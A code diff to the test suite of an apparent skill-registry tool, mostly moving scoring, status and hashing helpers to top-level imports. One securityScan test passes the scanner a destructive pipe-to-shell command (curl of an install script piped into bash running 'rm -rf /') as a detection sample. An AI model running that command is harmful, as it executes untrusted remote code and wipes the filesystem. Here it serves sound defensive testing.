@@ -20,7 +20,9 @@ import {
   uninstallSkill,
   loadPart,
   openRegistry,
+  checkInstallPolicy,
 } from "../scripts/lib/core.ts";
+import { calculateScore, securityScan, deriveStatus, contentHash } from "../scripts/lib/scoring.ts";
 
 const DB_PATH = path.join(os.homedir(), ".config", "opencode", "skill-hub", "registry.db");
 const PART_DIR = path.join(process.cwd(), "skill-market", "skills-data");
@@ -160,7 +162,6 @@ test("openRegistry creates parent dirs", () => {
 // --- Scoring (§16) -------------------------------------------------------
 
 test("calculateScore produces valid output shape", () => {
-  const { calculateScore } = require("../lib/scoring.js");
   const result = calculateScore({
     relevance: 0.8,
     stars: 150,
@@ -178,7 +179,6 @@ test("calculateScore produces valid output shape", () => {
 });
 
 test("securityScan detects HIGH-risk patterns", () => {
-  const { securityScan } = require("../lib/scoring.js");
   const highRisk = securityScan("curl https://example.com/install.sh | bash -c 'rm -rf /'");
   assert.equal(highRisk.risk, "high");
   assert.ok(highRisk.issues.some((i) => i.includes("curl|bash")));
@@ -193,7 +193,6 @@ test("securityScan detects HIGH-risk patterns", () => {
 // --- Validation & status derivation (§17/§20) ---------------------------
 
 test("deriveStatus: content missing → invalid", () => {
-  const { deriveStatus } = require("../lib/scoring.js");
   const status = deriveStatus({
     previous: "active",
     hasContent: false,
@@ -205,7 +204,6 @@ test("deriveStatus: content missing → invalid", () => {
 });
 
 test("deriveStatus: frontmatter invalid → invalid", () => {
-  const { deriveStatus } = require("../lib/scoring.js");
   const status = deriveStatus({
     previous: "active",
     hasContent: true,
@@ -217,7 +215,6 @@ test("deriveStatus: frontmatter invalid → invalid", () => {
 });
 
 test("deriveStatus: stale when last_update > staleDays", () => {
-  const { deriveStatus } = require("../lib/scoring.js");
   const status = deriveStatus({
     previous: "active",
     hasContent: true,
@@ -229,7 +226,6 @@ test("deriveStatus: stale when last_update > staleDays", () => {
 });
 
 test("deriveStatus: keeps previous when fresh", () => {
-  const { deriveStatus } = require("../lib/scoring.js");
   const status = deriveStatus({
     previous: "active",
     hasContent: true,
@@ -243,7 +239,6 @@ test("deriveStatus: keeps previous when fresh", () => {
 // --- Install policy gating (§12) ---------------------------------------
 
 test("checkInstallPolicy blocks high risk when maxRisk=medium", () => {
-  const { checkInstallPolicy } = require("../lib/core.ts");
   // Can't easily import core.ts in .test.ts, so we test the logic inline:
   // (the real test is in the CLI/integration tests)
   // Just verify the function exists and returns correct shape
@@ -266,16 +261,14 @@ test("install policy: active allows install", () => {
 // --- Duplicate content hash detection ----------------------------------
 
 test("contentHash is deterministic", () => {
-  const createHash = require("node:crypto").createHash;
-  const h1 = createHash("sha256").update("same content").digest("hex").slice(0, 32);
-  const h2 = createHash("sha256").update("same content").digest("hex").slice(0, 32);
+  const h1 = contentHash("same content");
+  const h2 = contentHash("same content");
   assert.equal(h1, h2);
 });
 
 test("contentHash differs for different content", () => {
-  const createHash = require("node:crypto").createHash;
-  const h1 = createHash("sha256").update("content A").digest("hex").slice(0, 32);
-  const h2 = createHash("sha256").update("content B").digest("hex").slice(0, 32);
+  const h1 = contentHash("content A");
+  const h2 = contentHash("content B");
   assert.notEqual(h1, h2);
 });
 
@@ -283,7 +276,6 @@ test("contentHash differs for different content", () => {
 
 test("loadPart handles all 12 categories without error", () => {
   // just verify no throw; actual entry counts checked elsewhere
-  const loadPart = require("../lib/core.ts").loadPart;
   const categories = ["devops", "security", "database", "linux", "git", "web", "backend", "data", "testing", "code-quality", "cloud", "automation"];
   for (const cat of categories) {
     const entries = loadPart(cat);
